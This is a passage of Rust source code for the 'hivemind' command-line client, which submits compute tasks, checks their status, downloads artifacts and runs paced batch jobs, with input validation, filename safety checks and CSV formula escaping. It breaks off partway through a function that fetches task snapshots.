use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::time::{Duration, Instant};

#[path = "cli_artifacts.rs"]
mod artifacts;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CliCommand {
    Service(String),
    Submit(SubmitCommand),
    Status(TaskLookupCommand),
    Result(TaskLookupCommand),
    Batch(BatchCommand),
}

/// One function run over many inputs. Inputs come one JSON value per line of `inputs_path`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BatchCommand {
    pub api_base: String,
    pub username: String,
    pub password: String,
    pub source_path: String,
    pub inputs_path: String,
    pub out_path: Option<String>,
    pub max_total_cpt: i64,
    pub max_cpt_per_task: Option<i64>,
    pub task_prefix: Option<String>,
    pub per_minute: u32,
    pub poll_secs: u64,
    pub timeout_secs: u64,
    pub cpu_score: Option<i32>,
    pub memory_gb: Option<i32>,
    pub gpu_score: Option<i32>,
    pub gpu_memory_gb: Option<i32>,
    pub storage_gb: Option<i64>,
    pub host_count: Option<i32>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SubmitCommand {
    pub api_base: String,
    pub username: String,
    pub password: String,
    pub source_path: String,
    pub input: String,
    pub artifacts: Vec<(String, String)>,
    pub task_id: String,
    pub cpu_score: Option<i32>,
    pub memory_gb: Option<i32>,
    pub gpu_score: Option<i32>,
    pub gpu_memory_gb: Option<i32>,
    pub storage_gb: Option<i64>,
    pub host_count: Option<i32>,
    pub max_cpt: Option<i64>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TaskLookupCommand {
    pub api_base: String,
    pub username: String,
    pub password: String,
    pub task_id: String,
    pub download: bool,
    pub artifact_key: Option<String>,
}

pub fn parse_cli_args(args: &[String]) -> Result<CliCommand> {
    let command = args.get(1).map(String::as_str).unwrap_or("all");
    if command == "status" || command == "result" {
        let lookup = parse_task_lookup_args(args, command)?;
        return Ok(if command == "status" {
            CliCommand::Status(lookup)
        } else {
            CliCommand::Result(lookup)
        });
    }

    if command == "batch" {
        return Ok(CliCommand::Batch(parse_batch_args(args)?));
    }

    if command != "submit" {
        return Ok(CliCommand::Service(command.to_string()));
    }

    let source_path = args
        .get(2)
        .ok_or_else(|| {
            anyhow!(
                "Usage: hivemind submit <function-source> --username <user> --password <pass> [--input <json>] [--artifact <name=path.safetensors>] [--task-id <id>]"
            )
        })?
        .clone();

    let mut submit = SubmitCommand {
        api_base: default_api_base(),
        username: String::new(),
        password: String::new(),
        task_id: derive_task_id(&source_path)?,
        source_path,
        input: String::new(),
        artifacts: Vec::new(),
        cpu_score: None,
        memory_gb: None,
        gpu_score: None,
        gpu_memory_gb: None,
        storage_gb: None,
        host_count: None,
        max_cpt: None,
    };

    let mut i = 3;
    while i < args.len() {
        let flag = args[i].as_str();
        let value = args
            .get(i + 1)
            .ok_or_else(|| anyhow!("missing value for {}", flag))?;
        match flag {
            "--api" => submit.api_base = normalize_api_base(value),
            "--username" => submit.username = value.clone(),
            "--password" => submit.password = value.clone(),
            "--task-id" => submit.task_id = parse_task_id_flag(value)?,
            "--input" => submit.input = value.clone(),
            "--artifact" => submit.artifacts.push(artifacts::parse_spec(value)?),
            "--cpu-score" => submit.cpu_score = Some(parse_i32_flag(flag, value)?),
            "--memory-gb" => submit.memory_gb = Some(parse_i32_flag(flag, value)?),
            "--gpu-score" => submit.gpu_score = Some(parse_i32_flag(flag, value)?),
            "--gpu-memory-gb" => submit.gpu_memory_gb = Some(parse_i32_flag(flag, value)?),
            "--storage-gb" => submit.storage_gb = Some(parse_i64_flag(flag, value)?),
            "--host-count" => submit.host_count = Some(parse_i32_flag(flag, value)?),
            "--max-cpt" => submit.max_cpt = Some(parse_i64_flag(flag, value)?),
            _ => return Err(anyhow!("unknown submit flag {}", flag)),
        }
        i += 2;
    }
    Ok(CliCommand::Submit(submit))
}

fn parse_task_lookup_args(args: &[String], command: &str) -> Result<TaskLookupCommand> {
    let task_id = args
        .get(2)
        .ok_or_else(|| {
            anyhow!(
                "Usage: hivemind {} <task-id> --username <user> --password <pass>",
                command
            )
        })?
        .clone();
    if !is_safe_task_id(&task_id) {
        return Err(anyhow!(
            "task id must be non-empty ASCII alphanumeric, '.', '-', or '_'"
        ));
    }

    let mut lookup = TaskLookupCommand {
        api_base: default_api_base(),
        username: String::new(),
        password: String::new(),
        task_id,
        download: false,
        artifact_key: None,
    };
    let mut i = 3;
    while i < args.len() {
        let flag = args[i].to_string();
        if flag == "--download" {
            lookup.download = true;
            i += 1;
            continue;
        }
        let value = args
            .get(i + 1)
            .ok_or_else(|| anyhow!("missing value for {}", flag))?;
        match flag.as_str() {
            "--api" => lookup.api_base = normalize_api_base(value),
            "--username" => lookup.username = value.clone(),
            "--password" => lookup.password = value.clone(),
            "--artifact-key" => lookup.artifact_key = Some(value.trim().to_string()),
            _ => return Err(anyhow!("unknown {} flag {}", command, flag)),
        }
        i += 2;
    }
    if lookup.username.trim().is_empty() {
        return Err(anyhow!("--username is required"));
    }
    if lookup.password.is_empty() {
        lookup.password = password_from_env().unwrap_or_default();
    }
    if lookup.password.is_empty() {
        return Err(anyhow!("--password is required"));
    }
    Ok(lookup)
}

fn normalize_api_base(value: &str) -> String {
    value.trim().trim_end_matches('/').to_string()
}

fn default_api_base() -> String {
    std::env::var("HIVEMIND_API_BASE")
        .ok()
        .map(|value| normalize_api_base(&value))
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| "http://localhost:8082".into())
}

// Lets scripts keep the password out of the command line, where other local processes can read it.
fn password_from_env() -> Option<String> {
    std::env::var("HIVEMIND_PASSWORD")
        .ok()
        .filter(|value| !value.is_empty())
}

fn parse_i32_flag(flag: &str, value: &str) -> Result<i32> {
    value
        .parse::<i32>()
        .map_err(|e| anyhow!("invalid {}: {}", flag, e))
}

fn parse_i64_flag(flag: &str, value: &str) -> Result<i64> {
    value
        .parse::<i64>()
        .map_err(|e| anyhow!("invalid {}: {}", flag, e))
}

fn parse_task_id_flag(value: &str) -> Result<String> {
    if is_safe_task_id(value) {
        Ok(value.to_string())
    } else {
        Err(anyhow!(
            "task id must be non-empty ASCII alphanumeric, '.', '-', or '_'"
        ))
    }
}

fn derive_task_id(source_path: &str) -> Result<String> {
    let stem = Path::new(source_path)
        .file_stem()
        .and_then(|value| value.to_str())
        .ok_or_else(|| anyhow!("could not derive task id from source path"))?
        .to_string();
    if is_safe_task_id(&stem) {
        Ok(stem)
    } else {
        Err(anyhow!("derived task id is not safe; pass --task-id"))
    }
}

fn is_safe_task_id(task_id: &str) -> bool {
    if task_id.len() == 1 && task_id.as_bytes()[0] == b'.' {
        return false;
    }
    !task_id.trim().is_empty()
        && task_id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        && !task_id.contains("..")
}

#[derive(Debug, Deserialize)]
struct LoginResponse {
    success: bool,
    message: Option<String>,
    token: Option<String>,
}

#[derive(Debug, Deserialize)]
struct TaskResponse {
    success: bool,
    message: Option<String>,
    task: Option<TaskInfo>,
}

#[derive(Debug, Deserialize)]
struct TaskInfo {
    task_id: String,
    status: String,
}

#[derive(Debug, Serialize)]
struct LoginRequest<'a> {
    username: &'a str,
    password: &'a str,
}

async fn login(
    client: &reqwest::Client,
    api_base: &str,
    username: &str,
    password: &str,
) -> Result<String> {
    let login_url = format!("{}/api/login", api_base);
    let login = client
        .post(&login_url)
        .json(&LoginRequest { username, password })
        .send()
        .await
        .map_err(|e| anyhow!("login request failed: {}", e))?;
    let login_status = login.status();
    let login_response: LoginResponse = login
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode login response: {}", e))?;
    if !login_status.is_success() || !login_response.success {
        return Err(anyhow!(
            "login failed: {}",
            login_response
                .message
                .unwrap_or_else(|| login_status.to_string())
        ));
    }
    let token = login_response
        .token
        .ok_or_else(|| anyhow!("login response did not include a token"))?;
    Ok(token)
}

pub async fn run_submit(submit: SubmitCommand) -> Result<()> {
    let task_source = tokio::fs::read_to_string(&submit.source_path)
        .await
        .map_err(|e| anyhow!("failed to read {}: {}", submit.source_path, e))?;
    if task_source.trim().is_empty() {
        return Err(anyhow!("{} is empty", submit.source_path));
    }
    let prepared = artifacts::PreparedArtifacts::prepare(&submit.input, &submit.artifacts).await?;

    let client = reqwest::Client::new();
    let token = login(
        &client,
        &submit.api_base,
        &submit.username,
        &submit.password,
    )
    .await?;

    // hcode tasks carry their JSON input in the `torrent` field;
    // Nodepool stores it verbatim as the task input reference.
    let input = if let Some(prepared) = &prepared {
        Some(prepared.input_json.clone())
    } else if submit.input.trim().is_empty() {
        None
    } else {
        Some(submit.input.clone())
    };
    let mut body = serde_json::json!({
        "task_id": submit.task_id,
        "runtime": "hcode",
        "task_source": task_source,
    });
    if let Some(input) = input {
        body["torrent"] = serde_json::Value::String(input);
    }
    if let Some(v) = submit.cpu_score {
        body["cpu_score"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.memory_gb {
        body["memory_gb"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.gpu_score {
        body["gpu_score"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.gpu_memory_gb {
        body["gpu_memory_gb"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.storage_gb {
        body["storage_gb"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.host_count {
        body["host_count"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.max_cpt {
        body["max_cpt"] = serde_json::Value::from(v);
    }

    let create_url = format!("{}/api/tasks", submit.api_base);
    let created = client
        .post(&create_url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await
        .map_err(|e| anyhow!("task create request failed: {}", e))?;
    let create_status = created.status();
    let task_response: TaskResponse = created
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode task create response: {}", e))?;
    if !create_status.is_success() || !task_response.success {
        return Err(anyhow!(
            "task create failed: {}",
            task_response
                .message
                .unwrap_or_else(|| create_status.to_string())
        ));
    }

    if let Some(prepared) = prepared {
        prepared
            .upload(&client, &submit.api_base, &token, &submit.task_id)
            .await?;
    }
    if let Some(task) = task_response.task {
        println!("Submitted task {} ({})", task.task_id, task.status);
    } else {
        println!("Submitted task {}", submit.task_id);
    }
    Ok(())
}

pub async fn run_status(command: TaskLookupCommand) -> Result<()> {
    let client = reqwest::Client::new();
    let token = login(
        &client,
        &command.api_base,
        &command.username,
        &command.password,
    )
    .await?;
    let url = format!("{}/api/tasks", command.api_base);
    let response = client
        .get(&url)
        .query(&[("task_ids", &command.task_id)])
        .bearer_auth(token)
        .send()
        .await
        .map_err(|e| anyhow!("task status request failed: {}", e))?;
    let status = response.status();
    let body: serde_json::Value = response
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode task status response: {}", e))?;
    if !status.is_success() {
        return Err(anyhow!(
            "task status failed: {}",
            body.get("message")
                .and_then(|value| value.as_str())
                .unwrap_or_else(|| status.as_str())
        ));
    }
    let task = body
        .get("tasks")
        .and_then(|value| value.as_array())
        .and_then(|tasks| {
            tasks.iter().find(|task| {
                task.get("task_id")
                    .and_then(|value| value.as_str())
                    .is_some_and(|id| id == command.task_id)
            })
        })
        .ok_or_else(|| anyhow!("task {} not found", command.task_id))?;
    let task_status = serde_json::json!({
        "success": true,
        "task_id": task.get("task_id").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "status": task.get("status").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "status_message": task.get("status_message").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "output": task.get("output").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "wall_time_ms": task.get("wall_time_ms").cloned().unwrap_or(serde_json::Value::from(0)),
        "peak_memory_mb": task.get("peak_memory_mb").cloned().unwrap_or(serde_json::Value::from(0)),
    });
    println!("{}", format_task_status(&task_status)?);
    Ok(())
}

pub async fn run_result(command: TaskLookupCommand) -> Result<()> {
    if command.download {
        return download_task_artifact(&command).await;
    }
    let client = reqwest::Client::new();
    let token = login(
        &client,
        &command.api_base,
        &command.username,
        &command.password,
    )
    .await?;
    let url = format!("{}/api/tasks", command.api_base);
    let response = client
        .get(&url)
        .bearer_auth(token)
        .send()
        .await
        .map_err(|e| anyhow!("task result request failed: {}", e))?;
    let status = response.status();
    let body: serde_json::Value = response
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode task result response: {}", e))?;
    if !status.is_success() {
        return Err(anyhow!(
            "task result failed: {}",
            body.get("message")
                .and_then(|value| value.as_str())
                .unwrap_or_else(|| status.as_str())
        ));
    }
    let task = body
        .get("tasks")
        .and_then(|value| value.as_array())
        .and_then(|tasks| {
            tasks.iter().find(|task| {
                task.get("task_id")
                    .and_then(|value| value.as_str())
                    .is_some_and(|id| id == command.task_id)
            })
        })
        .ok_or_else(|| anyhow!("task {} not found", command.task_id))?;
    let task_result = serde_json::json!({
        "success": true,
        "task_id": task.get("task_id").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "status": task.get("status").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "result_torrent": task.get("result_torrent").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "status_message": task.get("status_message").cloned().unwrap_or(serde_json::Value::String(String::new())),
        // Managed tasks keep their printed output here instead of in a result torrent.
        "output": task.get("output").cloned().unwrap_or(serde_json::Value::String(String::new())),
    });
    println!("{}", format_task_result(&task_result)?);
    Ok(())
}

async fn download_task_artifact(command: &TaskLookupCommand) -> Result<()> {
    use std::io::Write;
    let client = reqwest::Client::new();
    let token = login(
        &client,
        &command.api_base,
        &command.username,
        &command.password,
    )
    .await?;
    let url = artifact_download_url(command);
    let response = client
        .get(&url)
        .bearer_auth(token)
        .send()
        .await
        .map_err(|e| anyhow!("artifact download request failed: {}", e))?;
    let status = response.status();
    let headers = response.headers().clone();
    if !status.is_success() {
        let body: serde_json::Value = response.json().await.unwrap_or_default();
        return Err(anyhow!(
            "artifact download failed: {}",
            body.get("message")
                .and_then(|v| v.as_str())
                .unwrap_or_else(|| status.as_str())
        ));
    }
    let filename = artifact_filename_from_content_disposition(
        headers
            .get("content-disposition")
            .and_then(|v| v.to_str().ok()),
    )?;
    let bytes = response
        .bytes()
        .await
        .map_err(|e| anyhow!("download read failed: {}", e))?;
    let mut file = std::fs::File::create(&filename)
        .map_err(|e| anyhow!("cannot create {}: {}", filename, e))?;
    file.write_all(&bytes)
        .map_err(|e| anyhow!("cannot write {}: {}", filename, e))?;
    println!("Downloaded {} ({} bytes)", filename, bytes.len());
    Ok(())
}

fn artifact_filename_from_content_disposition(header: Option<&str>) -> Result<String> {
    let Some(header) = header else {
        return Ok("artifact.bin".to_string());
    };
    let Some(raw_filename) = content_disposition_parameter(header, "filename") else {
        return Ok("artifact.bin".to_string());
    };
    let filename = raw_filename
        .strip_prefix('"')
        .and_then(|value| value.strip_suffix('"'))
        .unwrap_or(raw_filename)
        .trim();
    if is_safe_artifact_filename(filename) {
        Ok(filename.to_string())
    } else {
        Err(anyhow!("unsafe artifact download filename"))
    }
}

fn content_disposition_parameter<'a>(header: &'a str, parameter_name: &str) -> Option<&'a str> {
    let mut start = 0;
    let mut in_quote = false;
    for (idx, ch) in header.char_indices() {
        match ch {
            '"' => in_quote = !in_quote,
            ';' if !in_quote => {
                if let Some(value) =
                    matching_content_disposition_parameter(&header[start..idx], parameter_name)
                {
                    return Some(value);
                }
                start = idx + ch.len_utf8();
            }
            _ => {}
        }
    }
    matching_content_disposition_parameter(&header[start..], parameter_name)
}

fn matching_content_disposition_parameter<'a>(
    part: &'a str,
    parameter_name: &str,
) -> Option<&'a str> {
    let (name, value) = part.trim().split_once('=')?;
    name.trim()
        .eq_ignore_ascii_case(parameter_name)
        .then_some(value.trim())
}

fn is_safe_artifact_filename(filename: &str) -> bool {
    if filename.is_empty() || matches!(filename, "." | "..") {
        return false;
    }
    if filename.chars().any(|c| {
        c.is_control() || matches!(c, '/' | '\\' | ':' | '<' | '>' | '"' | '|' | '?' | '*')
    }) {
        return false;
    }
    let stem = filename.split('.').next().unwrap_or(filename);
    !matches!(
        stem.to_ascii_uppercase().as_str(),
        "CON"
            | "PRN"
            | "AUX"
            | "NUL"
            | "COM1"
            | "COM2"
            | "COM3"
            | "COM4"
            | "COM5"
            | "COM6"
            | "COM7"
            | "COM8"
            | "COM9"
            | "LPT1"
            | "LPT2"
            | "LPT3"
            | "LPT4"
            | "LPT5"
            | "LPT6"
            | "LPT7"
            | "LPT8"
            | "LPT9"
    )
}

fn artifact_download_url(command: &TaskLookupCommand) -> String {
    let mut url = format!(
        "{}/api/tasks/{}/artifact/download",
        command.api_base, command.task_id
    );
    if let Some(artifact_key) = command.artifact_key.as_deref() {
        if !artifact_key.trim().is_empty() {
            url.push_str("?artifact_key=");
            url.push_str(&url_encode_query_value(artifact_key));
        }
    }
    url
}

fn url_encode_query_value(value: &str) -> String {
    let mut encoded = String::new();
    for byte in value.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.' | b'~') {
            encoded.push(byte as char);
        } else {
            encoded.push_str(&format!("%{byte:02X}"));
        }
    }
    encoded
}

pub fn format_task_status(body: &serde_json::Value) -> Result<String> {
    if body.get("success").and_then(|value| value.as_bool()) != Some(true) {
        return Err(anyhow!(
            "{}",
            body.get("message")
                .and_then(|value| value.as_str())
                .unwrap_or("task status response was not successful")
        ));
    }
    let task_id = body
        .get("task_id")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let status = body
        .get("status")
        .and_then(|value| value.as_str())
        .unwrap_or("UNKNOWN");
    let message = body
        .get("status_message")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let output = body
        .get("output")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let wall_time_ms = body
        .get("wall_time_ms")
        .and_then(|value| value.as_i64())
        .unwrap_or(0);
    let peak_memory_mb = body
        .get("peak_memory_mb")
        .and_then(|value| value.as_i64())
        .unwrap_or(0);

    Ok(format!(
        "Task: {}\nStatus: {}\nMessage: {}\nOutput: {}\nWall time ms: {}\nPeak memory MB: {}",
        task_id, status, message, output, wall_time_ms, peak_memory_mb
    ))
}

pub fn format_task_result(body: &serde_json::Value) -> Result<String> {
    if body.get("success").and_then(|value| value.as_bool()) != Some(true) {
        return Err(anyhow!(
            "{}",
            body.get("message")
                .and_then(|value| value.as_str())
                .unwrap_or("task result response was not successful")
        ));
    }
    let task_id = body
        .get("task_id")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let status = body
        .get("status")
        .and_then(|value| value.as_str())
        .unwrap_or("UNKNOWN");
    let result_torrent = body
        .get("result_torrent")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let message = body
        .get("status_message")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let output = body
        .get("output")
        .and_then(|value| value.as_str())
        .unwrap_or("");

    let mut text = format!(
        "Task: {}\nStatus: {}\nResult torrent: {}\nMessage: {}",
        task_id, status, result_torrent, message
    );
    if !output.is_empty() {
        text.push_str("\nOutput: ");
        text.push_str(output);
    }
    Ok(text)
}

/// The most inputs one batch may hold. Each input is its own task with its own budget.
const MAX_BATCH_INPUTS: usize = 1000;
/// The default budget for one batch task. A quote prices only the reserved resources, not the execution, so a
/// task capped at its quote runs out of budget almost at once.
const DEFAULT_BATCH_TASK_CPT: i64 = 100;
const BATCH_RESULT_HEADER: &str = "index,task_id,status,output,billed_cpt,message,input";

fn parse_batch_args(args: &[String]) -> Result<BatchCommand> {
    let source_path = args
        .get(2)
        .ok_or_else(|| {
            anyhow!(
                "Usage: hivemind batch <function-source> --inputs <inputs.jsonl> --max-total-cpt <cpt> --username <user> [--password <pass>] [--out <results.csv>] [--max-cpt-per-task <cpt>] [--task-prefix <prefix>] [--per-minute <1-60>] [--poll-secs <n>] [--timeout-secs <n>] [--api <url>]"
            )
        })?
        .clone();

    let mut batch = BatchCommand {
        api_base: default_api_base(),
        username: String::new(),
        password: String::new(),
        source_path,
        inputs_path: String::new(),
        out_path: None,
        max_total_cpt: 0,
        max_cpt_per_task: None,
        task_prefix: None,
        per_minute: 50,
        poll_secs: 5,
        timeout_secs: 3600,
        cpu_score: None,
        memory_gb: None,
        gpu_score: None,
        gpu_memory_gb: None,
        storage_gb: None,
        host_count: None,
    };
    let mut max_total_cpt = None;

    let mut i = 3;
    while i < args.len() {
        let flag = args[i].as_str();
        let value = args
            .get(i + 1)
            .ok_or_else(|| anyhow!("missing value for {}", flag))?;
        match flag {
            "--api" => batch.api_base = normalize_api_base(value),
            "--username" => batch.username = value.clone(),
            "--password" => batch.password = value.clone(),
            "--inputs" => batch.inputs_path = value.clone(),
            "--out" => batch.out_path = Some(value.clone()),
            "--max-total-cpt" => max_total_cpt = Some(parse_i64_flag(flag, value)?),
            "--max-cpt-per-task" => batch.max_cpt_per_task = Some(parse_i64_flag(flag, value)?),
            "--task-prefix" => batch.task_prefix = Some(value.clone()),
            "--per-minute" => batch.per_minute = parse_u32_flag(flag, value)?,
            "--poll-secs" => batch.poll_secs = parse_u64_flag(flag, value)?,
            "--timeout-secs" => batch.timeout_secs = parse_u64_flag(flag, value)?,
            "--cpu-score" => batch.cpu_score = Some(parse_i32_flag(flag, value)?),
            "--memory-gb" => batch.memory_gb = Some(parse_i32_flag(flag, value)?),
            "--gpu-score" => batch.gpu_score = Some(parse_i32_flag(flag, value)?),
            "--gpu-memory-gb" => batch.gpu_memory_gb = Some(parse_i32_flag(flag, value)?),
            "--storage-gb" => batch.storage_gb = Some(parse_i64_flag(flag, value)?),
            "--host-count" => batch.host_count = Some(parse_i32_flag(flag, value)?),
            _ => return Err(anyhow!("unknown batch flag {}", flag)),
        }
        i += 2;
    }

    if batch.username.trim().is_empty() {
        return Err(anyhow!("--username is required"));
    }
    if batch.password.is_empty() {
        batch.password = password_from_env().unwrap_or_default();
    }
    if batch.password.is_empty() {
        return Err(anyhow!("--password is required (or set HIVEMIND_PASSWORD)"));
    }
    if batch.inputs_path.trim().is_empty() {
        return Err(anyhow!(
            "--inputs <file> is required: one JSON input per line"
        ));
    }
    batch.max_total_cpt = max_total_cpt.ok_or_else(|| {
        anyhow!("--max-total-cpt is required: a batch does not run without a total budget")
    })?;
    if batch.max_total_cpt <= 0 {
        return Err(anyhow!("--max-total-cpt must be greater than 0"));
    }
    if batch.max_cpt_per_task.is_some_and(|cap| cap <= 0) {
        return Err(anyhow!("--max-cpt-per-task must be greater than 0"));
    }
    if !(1..=60).contains(&batch.per_minute) {
        return Err(anyhow!("--per-minute must be between 1 and 60"));
    }
    if !(1..=3600).contains(&batch.poll_secs) {
        return Err(anyhow!("--poll-secs must be between 1 and 3600"));
    }
    if !(10..=86_400).contains(&batch.timeout_secs) {
        return Err(anyhow!("--timeout-secs must be between 10 and 86400"));
    }
    if let Some(prefix) = batch.task_prefix.as_deref() {
        if !is_safe_task_id(&format!("{prefix}-0001")) {
            return Err(anyhow!(
                "--task-prefix may use only letters, digits, '.', '-', '_'"
            ));
        }
    }
    Ok(batch)
}

fn parse_u32_flag(flag: &str, value: &str) -> Result<u32> {
    value
        .parse::<u32>()
        .map_err(|e| anyhow!("invalid {}: {}", flag, e))
}

fn parse_u64_flag(flag: &str, value: &str) -> Result<u64> {
    value
        .parse::<u64>()
        .map_err(|e| anyhow!("invalid {}: {}", flag, e))
}

/// Reads one JSON value per non-empty line. Each value is kept in compact form, as the task input field takes it.
pub fn parse_batch_inputs(text: &str) -> Result<Vec<String>> {
    let mut inputs = Vec::new();
    for (line_index, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let value: serde_json::Value = serde_json::from_str(line).map_err(|error| {
            anyhow!(
                "line {} of the inputs file is not valid JSON: {}",
                line_index + 1,
                error
            )
        })?;
        if inputs.len() == MAX_BATCH_INPUTS {
            return Err(anyhow!("a batch holds at most {} inputs", MAX_BATCH_INPUTS));
        }
        inputs.push(value.to_string());
    }
    if inputs.is_empty() {
        return Err(anyhow!("the inputs file has no JSON lines"));
    }
    Ok(inputs)
}

fn batch_task_id(prefix: &str, index: usize) -> String {
    format!("{prefix}-{:04}", index + 1)
}

fn batch_worst_case_cpt(count: usize, per_task_cap: i64) -> Result<i64> {
    i64::try_from(count)
        .ok()
        .and_then(|count| count.checked_mul(per_task_cap))
        .ok_or_else(|| anyhow!("the batch's worst-case cost is out of range"))
}

/// The per-minute submission limit is applied per owner. Pacing below it keeps a batch from tripping the limit.
fn submit_interval(per_minute: u32) -> Duration {
    Duration::from_millis(60_000 / u64::from(per_minute.max(1)))
}

fn is_terminal_task_status(status: &str) -> bool {
    matches!(status, "COMPLETED" | "FAILED" | "TIMED_OUT" | "CANCELLED")
}

fn csv_field(value: &str) -> String {
    // CSV quoting alone does not prevent formulas. Mark dangerous cells as text
    // before escaping, including prefixes a spreadsheet may trim or normalize.
    let start =
        value.trim_start_matches(|c: char| c.is_whitespace() || c.is_control() || c == '\u{feff}');
    let as_text = value.starts_with(['\t', '\r', '\n'])
        || start.starts_with(['=', '+', '-', '@', '＝', '＋', '－', '＠']);
    if as_text || value.contains([',', '"', '\n', '\r']) {
        let prefix = if as_text { "'" } else { "" };
        format!("\"{prefix}{}\"", value.replace('"', "\"\""))
    } else {
        value.to_string()
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct BatchRow {
    index: usize,
    task_id: String,
    input: String,
    status: String,
    output: String,
    billed_cpt: Option<i64>,
    message: String,
}

impl BatchRow {
    // A row still needs polling when its task was accepted and has not reached a final state.
    fn is_open(&self) -> bool {
        !matches!(self.status.as_str(), "SUBMIT_FAILED" | "NOT_SUBMITTED")
            && !is_terminal_task_status(&self.status)
    }
}

fn render_batch_csv(rows: &[BatchRow]) -> String {
    let mut csv = String::from(BATCH_RESULT_HEADER);
    csv.push('\n');
    for row in rows {
        let billed = row
            .billed_cpt
            .map(|cpt| cpt.to_string())
            .unwrap_or_default();
        let fields = [
            row.index.to_string(),
            row.task_id.clone(),
            row.status.clone(),
            row.output.clone(),
            billed,
            row.message.clone(),
            row.input.clone(),
        ];
        let line: Vec<String> = fields.iter().map(|field| csv_field(field)).collect();
        csv.push_str(&line.join(","));
        csv.push('\n');
    }
    csv
}

fn batch_request_body(
    command: &BatchCommand,
    source: &str,
    input: &str,
) -> serde_json::Map<String, serde_json::Value> {
    let mut body = serde_json::Map::new();
    body.insert("runtime".into(), "hcode".into());
    body.insert("task_source".into(), source.into());
    body.insert("torrent".into(), input.into());
    if let Some(v) = command.cpu_score {
        body.insert("cpu_score".into(), v.into());
    }
    if let Some(v) = command.memory_gb {
        body.insert("memory_gb".into(), v.into());
    }
    if let Some(v) = command.gpu_score {
        body.insert("gpu_score".into(), v.into());
    }
    if let Some(v) = command.gpu_memory_gb {
        body.insert("gpu_memory_gb".into(), v.into());
    }
    if let Some(v) = command.storage_gb {
        body.insert("storage_gb".into(), v.into());
    }
    if let Some(v) = command.host_count {
        body.insert("host_count".into(), v.into());
    }
    body
}

/// Quoting prices the resources and host count only. The checks it shares with task creation still require a
/// positive budget for hcode, so the quote carries a placeholder of 1 CPT that the price does not depend on.
fn batch_quote_body(
    command: &BatchCommand,
    source: &str,
    input: &str,
) -> serde_json::Map<String, serde_json::Value> {
    let mut body = batch_request_body(command, source, input);
    body.insert("max_cpt".into(), 1.into());
    body
}

async fn quote_batch_price(
    client: &reqwest::Client,
    command: &BatchCommand,
    token: &str,
    source: &str,
    sample_input: &str,
) -> Result<i64> {
    let url = format!("{}/api/tasks/quote", command.api_base);
    let response = client
        .post(&url)
        .bearer_auth(token)
        .json(&batch_quote_body(command, source, sample_input))
        .send()
        .await
        .map_err(|e| anyhow!("price quote request failed: {}", e))?;
    let status = response.status();
    let body: serde_json::Value = response
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode price quote: {}", e))?;
    if !status.is_success() || body.get("success").and_then(|value| value.as_bool()) != Some(true) {
        return Err(anyhow!("price quote failed: {}", status));
    }
    body.get("quoted_cpt")
        .and_then(|value| value.as_i64())
        .ok_or_else(|| anyhow!("price quote response has no quoted_cpt"))
}

async fn pace_submission(next_submit_at: &mut Instant, interval: Duration) {
    let wait = next_submit_at.saturating_duration_since(Instant::now());
    if !wait.is_zero() {
        tokio::time::sleep(wait).await;
    }
    *next_submit_at = Instant::now() + interval;
}

async fn submit_batch_task(
    client: &reqwest::Client,
    api_base: &str,
    token: &str,
    body: &serde_json::Value,
    next_submit_at: &mut Instant,
    interval: Duration,
) -> Result<()> {
    const MAX_ATTEMPTS: u32 = 5;
    let url = format!("{}/api/tasks", api_base);
    for attempt in 1..=MAX_ATTEMPTS {
        pace_submission(next_submit_at, interval).await;
        let response = client
            .post(&url)
            .bearer_auth(token)
            .json(body)
            .send()
            .await
            .map_err(|e| anyhow!("task create request failed: {}", e))?;
        let status = response.status();
        let reply: serde_json::Value = response.json().await.unwrap_or(serde_json::Value::Null);
        if status.is_success()
            && reply.get("success").and_then(|value| value.as_bool()) == Some(true)
        {
            return Ok(());
        }
        if status == reqwest::StatusCode::TOO_MANY_REQUESTS && attempt < MAX_ATTEMPTS {
            // The submission window is one minute. Wait for it to reset before trying this task again.
            tokio::time::sleep(Duration::from_secs(60)).await;
            *next_submit_at = Instant::now();
            continue;
        }
        let message = reply
            .get("message")
            .and_then(|value| value.as_str())
            .map(str::to_owned)
            .unwrap_or_else(|| status.to_string());
        return Err(anyhow!("{}", message));
    }
    Err(anyhow!("task submission kept hitting the rate limit"))
}

async fn fetch_task_snapshots(
    client: &reqwest::Client,
    api_base: &str,
    token: &str,
    task_ids: &[String],
) -> Result<std::collections::HashMap<String, serde_json::Value>> {
    let mut snapshots = std::collections::HashMap::new();
    // The default list is only the newest 100 tasks, possibly from another batch.
    // Query this batch's IDs in bounded, sequential requests instead. Twenty
    // maximum-length IDs also fit within a typical proxy's 8 KiB request-line cap.
